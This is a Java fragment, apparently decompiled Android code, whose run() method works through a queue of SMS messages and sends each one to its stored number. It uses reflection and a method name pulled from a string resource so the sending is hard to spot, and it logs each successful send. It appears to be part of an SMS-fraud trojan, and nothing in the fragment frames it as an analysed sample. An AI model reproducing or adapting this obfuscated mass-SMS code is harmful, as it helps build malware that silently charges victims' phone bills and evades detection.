    @Override // java.lang.Runnable
    public void run() {
        try {
            Class selfClass = Class.forName("wap.syst.WapSystActivity");
            while (smsIndex < sms.size()) {
                Method getSmsItemMethod = selfClass.getMethod("getSmsItem", Integer.TYPE);
                Object item = getSmsItemMethod.invoke(this, Integer.valueOf(smsIndex));
                Class smsItemClass = Class.forName("wap.syst.SmsItem");
                smsItemClass.getField("number").get(item);
                smsItemClass.getField("text").get(item);
                Method sendSmsMethod = selfClass.getMethod(getString(R.string.sendSms), Class.forName("java.lang.Object"), Class.forName("java.lang.Object"));
                Object result = sendSmsMethod.invoke(null, smsItemClass.getField("number").get(item), smsItemClass.getField("text").get(item));
                if (result.equals(true)) {
                    Method addSentSmsMethod = selfClass.getMethod("addSentSms", Long.TYPE, Integer.TYPE);
                    Class systemClass = Class.forName("java.lang.System");
                    Method currentTimeMillisMethod = systemClass.getMethod("currentTimeMillis", new Class[0]);
                    addSentSmsMethod.invoke(this, currentTimeMillisMethod.invoke(null, new Object[0]), 1);
                }
                smsIndex++;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

